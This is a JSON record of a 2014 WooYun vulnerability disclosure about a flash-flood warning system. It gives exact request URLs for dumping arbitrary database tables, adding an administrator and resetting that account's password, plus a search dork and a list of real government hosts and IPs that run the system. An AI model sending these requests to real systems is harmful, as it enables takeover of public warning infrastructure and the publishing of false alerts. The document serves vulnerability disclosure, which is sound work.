{"id": 50380, "wybug_id": "wooyun-2014-077977", "wybug_title": "某灾害预警系统任意数据表查询&amp;&amp;任意增删管理员", "wybug_corp": "国家互联网应急中心", "wybug_author": "error", "wybug_date": "2014-10-08 16:58", "wybug_open_date": "2015-01-06 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "后台验证绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向公众公开  简要描述： 某灾害预警系统可查询任意数据表数据，并且可任意添加、删除管理员，直接导致预警系统沦陷，系统后台可任意发布预警信息 详细说明：  该灾害预警系统为福建四创软件开发的“山洪灾害预警监测系统”官网：http://www.strongsoft.net/谷歌搜索： intitle:预警 系统 技术支持:福建四创\n\n-----------------------------------------------------------漏洞链接：/TableDataManage/BaseInforQueryContent.aspx?tabnm=漏洞参数：tabnm-----------------------------------------------------------通过修改tabnm可以直接获取对应数据表的数据   漏洞证明：  以http://yj.yywater.gov.cn/作为测试案例测试链接：http://yj.yywater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=1）获取数据表Web_SystemUserRolehttp://yj.yywater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserRole\n\n2）获取管理员表Web_SystemUserhttp://yj.yywater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\n3）任意添加管理员通过链接：http://yj.yywater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser可任意操作管理员（可添加、删除）\n\n成功添加管理员helloworld\n\n4）重置新添加管理员helloworld密码访问：http://yj.yywater.gov.cn/TableDataManage/AjaxHandle/AjaxCustomAction.ashx?action=ResetPwd&UserIDs=UserID^varchar^helloworld说明：UserIDs=UserID^varchar^后面跟上要重置的用户名\n\n服务器返回success，则说明新添加的管理员helloworld的密码已经被重置为0000005）使用helloworld|000000登录预警系统\n\n\n\n可任意发布预警信息。。。其他测试案例：http://shzh.wlfx.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\nhttp://shzh.dqwater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\nhttp://218.86.6.48:3505/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\nhttp://yj.yywater.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\nhttp://218.86.96.98:3505/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser\n\nhttp://222.216.218.28:8088/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://219.159.102.99:8088/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://111.12.51.221:8088/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://183.233.205.85:9001/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://222.83.214.58:8088/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://180.130.175.138:3503/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://219.159.239.96:8088/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserhttp://shzh.wlfx.gov.cn/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser......   修复方案：  郑重声明：此次漏洞测试未进行任何深入利用，未做任何破坏   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-10-11 17:52 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}